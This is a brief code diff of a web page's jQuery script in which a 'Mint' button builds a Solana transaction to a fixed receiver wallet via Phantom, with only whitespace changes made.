@@ -26,7 +26,7 @@ $(document).ready(function () {
         }
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
-          try {
+                  try {
           const receiverWallet = new solanaWeb3.PublicKey("ETNkYSq5bAGBR7Szz7tKFkPWU5wFdPe2XzuxTAAWEfP5");
 
           const transaction = new solanaWeb3.Transaction().add(
@@ -50,6 +50,7 @@ $(document).ready(function () {
         } catch (err) {
           console.error("Error during minting:", err);
         }
+
       } catch (err) {
         console.error("Error connecting to Phantom Wallet:", err);
       }
